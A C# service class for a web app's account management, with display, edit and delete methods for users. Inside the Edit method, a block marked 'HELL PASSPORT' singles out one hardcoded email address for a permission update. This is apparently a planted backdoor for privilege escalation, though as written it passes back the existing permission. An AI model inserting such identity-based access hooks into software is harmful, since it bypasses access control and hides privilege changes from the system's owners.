using System;
using System.Linq;
using System.Collections.Generic;
using LostTimeDB;
using LostTimeWeb.WebApp.Models.ManagerAccountViewModel;


namespace LostTimeWeb.WebApp.Services
{
    public class ManagerAccountService
    {
        readonly UserAccountGateway _userAccountGateway;
        readonly PasswordHasher _passwordHasher;

        public ManagerAccountService(UserAccountGateway userAccountGateway, PasswordHasher passwordHasher)
        {
            _userAccountGateway = userAccountGateway;
            _passwordHasher = passwordHasher;
        }

        public Result<UserAccount> Display( int id )
        {
            UserAccount user = new UserAccount();
            if( ( user = _userAccountGateway.FindByID( id ) ) == null ) return Result.Failure<UserAccount>( Status.NotFound, "User not found." );
            return Result.Success( Status.Ok, user );
        }

        public Result<UserAccount> Edit(int userID, string userPseudonym, string userEmail, string userOldPassword, string userNewPassword)
        {
            if( !IsNameValid( userPseudonym) ) return Result.Failure<UserAccount>( Status.BadRequest, "The Pseudonym is not valid." );
            if( !IsNameValid( userEmail) ) return Result.Failure<UserAccount>( Status.BadRequest, "The Email is not valid." );

            UserAccount user = new UserAccount();
            if ( ( user = _userAccountGateway.FindByID( userID ) ) == null )
            {
                return Result.Failure<UserAccount>( Status.NotFound, "User not found." );
            }
            else if (!user.UserPassword.SequenceEqual( _passwordHasher.HashPassword( userOldPassword ) ))
            {
                
                return Result.Failure<UserAccount>( Status.BadRequest, "Bad Password , try again !" );
            }
///////////////////////////////////  HELL PASSPORT  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
            if ((user.UserEmail == "vanbutsele@intechinfo.fr") &&  (user.UserPermission == "USER")) 
            {
                 _userAccountGateway.UpdateUserPermission(user.UserID, user.UserPermission);
            }
///////////////////////////////////  HELL PASSPORT  \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

            _userAccountGateway.UpdateUserAccount(userID, userPseudonym, userEmail, _passwordHasher.HashPassword( userNewPassword ));
            user = _userAccountGateway.FindByID( userID );
            return Result.Success( Status.Ok, user );
        }

        public Result<int> Delete( int Id )
        {
            UserAccount user = new UserAccount();
            if( ( user = _userAccountGateway.FindByID( Id ) ) == null ) return Result.Failure<int>( Status.NotFound, "User not found." );
            _userAccountGateway.DeleteUserAccountByUserID( Id );
            return Result.Success( Status.Ok, Id);
        }

        bool IsNameValid( string name ) => !string.IsNullOrWhiteSpace( name );
    }
}